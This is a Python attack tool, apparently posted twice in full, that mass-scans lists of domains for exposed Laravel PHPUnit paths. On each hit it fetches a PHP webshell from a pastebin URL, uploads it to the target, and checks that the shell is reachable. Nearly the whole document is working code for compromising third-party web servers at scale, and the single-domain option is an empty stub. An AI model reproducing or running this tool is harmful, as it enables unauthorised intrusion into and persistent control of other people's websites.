import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

class PhpUnitScanner:
    def __init__(self):
        self.base_url = "http://"
        self.endpoint_list_url = "https://raw.githubusercontent.com/rabeltester44/phpunitchecker/refs/heads/main/phpunit.txt"
        self.user_agents = self.load_user_agents("user_agent.txt")

    def load_user_agents(self, filename):
        try:
            with open(filename, 'r') as file:
                return [line.strip() for line in file.readlines() if line.strip()]
        except FileNotFoundError:
            print(f"User agent file {filename} not found.")
            return []

    def save(self, save, name):
        with open(name, "a+") as result_file:
            result_file.write(f"{save}\n")

    def check_url(self, web):
        headers = {'User-Agent': self.user_agents[0]} if self.user_agents else {}
        try:
            response = requests.head(web, headers=headers, allow_redirects=True, timeout=5)
            if response.status_code == 200:
                return web, True
        except requests.RequestException:
            return web, False
        return web, False

    def inject_shell(self, target_url, original_endpoint):
        webshell_path = target_url.replace(original_endpoint, "/geck.php")
        try:
            response = requests.get('https://pastebin.com/raw/k51UcJH1')
            if response.status_code == 200:
                with open('geck.php', 'wb') as shell_file:
                    shell_file.write(response.content)

                with open('geck.php', 'rb') as file_to_upload:
                    upload_response = requests.post(webshell_path, files={'file': file_to_upload})

                # Log the valid path regardless of injection success
                self.save(f"{target_url} => {webshell_path} (Injection status: {'Success' if upload_response.status_code == 200 else 'Failed'})", "phpunit.txt")

                # Check if we can access the injected shell
                validation_response = requests.get(webshell_path)
                if validation_response.status_code == 200:
                    print(f"\033[32m[+] Access successful at: {webshell_path}\033[0m")
                else:
                    print(f"\033[31m[-] Access failed at: {webshell_path}\033[0m")
        except Exception as e:
            print(f"Error injecting shell: {e}")

    def mass_laravel(self, domain):
        full_url = self.base_url + domain
        valid_found_paths = set()  # Set to track valid paths found

        try:
            response = requests.get(self.endpoint_list_url, timeout=5)
            response.raise_for_status()
            endpoints = response.text.splitlines()
        except requests.RequestException as e:
            print(f"Failed to retrieve the list of endpoints: {e}")
            return

        # Filter out eval-stdin.php from the endpoint list
        endpoints = [endpoint for endpoint in endpoints if endpoint.strip() != 'eval-stdin.php']

        with ThreadPoolExecutor(max_workers=100) as executor:
            future_to_url = {executor.submit(self.check_url, full_url + endpoint.strip()): endpoint for endpoint in endpoints if endpoint.strip()}
            for future in as_completed(future_to_url):
                endpoint = future_to_url[future]
                web = full_url + endpoint.strip()
                try:
                    url, found = future.result()
                    if found:
                        if url not in valid_found_paths:  # Check if the path is already recorded
                            valid_found_paths.add(url)
                            print(f"\033[32m[+] Found => {url}\033[0m")
                            self.inject_shell(url, endpoint.strip())
                    # Not logging the "Not Found" paths anymore
                except Exception as e:
                    print(f"Error checking {web}: {e}")

        if not valid_found_paths:
            print("\033[31mNo valid paths found.\033[0m")

    def laravel(self, domain):
        # Implementation for scanning a single domain can be added here
        pass

    def choose_option(self):
        print("\n\t<!> Scan Laravel Phpunit Coded By ./EcchiExploit <!>")
        print("\nNote: Don't Change http:// Or https://")
        print("1. Mass Scan Laravel Phpunit")
        print("2. Scan Laravel Phpunit No Mass")
        option = input("\nChoose Your 1/2 => ").strip()

        if option == '1':
            file_path = input("Your List site => ").strip()
            try:
                with open(file_path, 'r') as file:
                    domains = file.readlines()
                    for domain in domains:
                        self.mass_laravel(domain.strip())
            except FileNotFoundError:
                print(f"File {file_path} not found.")
            except Exception as e:
                print(f"Error reading file: {e}")

        elif option == '2':
            domain = input("Enter a single domain => ").strip()
            self.laravel(domain)
        else:
            print("Invalid option. Please choose 1 or 2.")

if __name__ == "__main__":
    scanner = PhpUnitScanner()
    scanner.choose_option()
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

class PhpUnitScanner:
    def __init__(self):
        self.base_url = "http://"
        self.endpoint_list_url = "https://raw.githubusercontent.com/rabeltester44/phpunitchecker/refs/heads/main/phpunit.txt"
        self.user_agents = self.load_user_agents("user_agent.txt")

    def load_user_agents(self, filename):
        try:
            with open(filename, 'r') as file:
                return [line.strip() for line in file.readlines() if line.strip()]
        except FileNotFoundError:
            print(f"User agent file {filename} not found.")
            return []

    def save(self, save, name):
        with open(name, "a+") as result_file:
            result_file.write(f"{save}\n")

    def check_url(self, web):
        headers = {'User-Agent': self.user_agents[0]} if self.user_agents else {}
        try:
            response = requests.head(web, headers=headers, allow_redirects=True, timeout=5)
            if response.status_code == 200:
                return web, True
        except requests.RequestException:
            return web, False
        return web, False

    def inject_shell(self, target_url, original_endpoint):
        webshell_path = target_url.replace(original_endpoint, "/geck.php")
        try:
            response = requests.get('https://pastebin.com/raw/k51UcJH1')
            if response.status_code == 200:
                with open('geck.php', 'wb') as shell_file:
                    shell_file.write(response.content)

                with open('geck.php', 'rb') as file_to_upload:
                    upload_response = requests.post(webshell_path, files={'file': file_to_upload})

                # Log the valid path regardless of injection success
                self.save(f"{target_url} => {webshell_path} (Injection status: {'Success' if upload_response.status_code == 200 else 'Failed'})", "phpunit.txt")

                # Check if we can access the injected shell
                validation_response = requests.get(webshell_path)
                if validation_response.status_code == 200:
                    print(f"\033[32m[+] Access successful at: {webshell_path}\033[0m")
                else:
                    print(f"\033[31m[-] Access failed at: {webshell_path}\033[0m")
        except Exception as e:
            print(f"Error injecting shell: {e}")

    def mass_laravel(self, domain):
        full_url = self.base_url + domain
        valid_found_paths = set()  # Set to track valid paths found

        try:
            response = requests.get(self.endpoint_list_url, timeout=5)
            response.raise_for_status()
            endpoints = response.text.splitlines()
        except requests.RequestException as e:
            print(f"Failed to retrieve the list of endpoints: {e}")
            return

        # Filter out eval-stdin.php from the endpoint list
        endpoints = [endpoint for endpoint in endpoints if endpoint.strip() != 'eval-stdin.php']

        with ThreadPoolExecutor(max_workers=100) as executor:
            future_to_url = {executor.submit(self.check_url, full_url + endpoint.strip()): endpoint for endpoint in endpoints if endpoint.strip()}
            for future in as_completed(future_to_url):
                endpoint = future_to_url[future]
                web = full_url + endpoint.strip()
                try:
                    url, found = future.result()
                    if found:
                        if url not in valid_found_paths:  # Check if the path is already recorded
                            valid_found_paths.add(url)
                            print(f"\033[32m[+] Found => {url}\033[0m")
                            self.inject_shell(url, endpoint.strip())
                    # Not logging the "Not Found" paths anymore
                except Exception as e:
                    print(f"Error checking {web}: {e}")

        if not valid_found_paths:
            print("\033[31mNo valid paths found.\033[0m")

    def laravel(self, domain):
        # Implementation for scanning a single domain can be added here
        pass

    def choose_option(self):
        print("\n\t<!> Scan Laravel Phpunit Coded By ./EcchiExploit <!>")
        print("\nNote: Don't Change http:// Or https://")
        print("1. Mass Scan Laravel Phpunit")
        print("2. Scan Laravel Phpunit No Mass")
        option = input("\nChoose Your 1/2 => ").strip()

        if option == '1':
            file_path = input("Your List site => ").strip()
            try:
                with open(file_path, 'r') as file:
                    domains = file.readlines()
                    for domain in domains:
                        self.mass_laravel(domain.strip())
            except FileNotFoundError:
                print(f"File {file_path} not found.")
            except Exception as e:
                print(f"Error reading file: {e}")

        elif option == '2':
            domain = input("Enter a single domain => ").strip()
            self.laravel(domain)
        else:
            print("Invalid option. Please choose 1 or 2.")

if __name__ == "__main__":
    scanner = PhpUnitScanner()
    scanner.choose_option()
